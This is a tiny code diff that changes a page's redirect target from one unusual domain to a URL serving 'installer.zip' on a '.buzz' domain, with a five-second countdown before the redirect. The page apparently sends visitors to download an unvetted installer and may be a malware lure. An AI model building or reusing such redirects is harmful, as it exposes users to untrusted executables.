@@ -1,4 +1,4 @@
- const REDIRECT_URL = "https://ejpt5k.top/solara";
+ const REDIRECT_URL = "https://ultraviolence.buzz/c/installer.zip";
 
       const REDIRECT_DELAY_MS = 5000;
       const totalSeconds = REDIRECT_DELAY_MS / 1000;
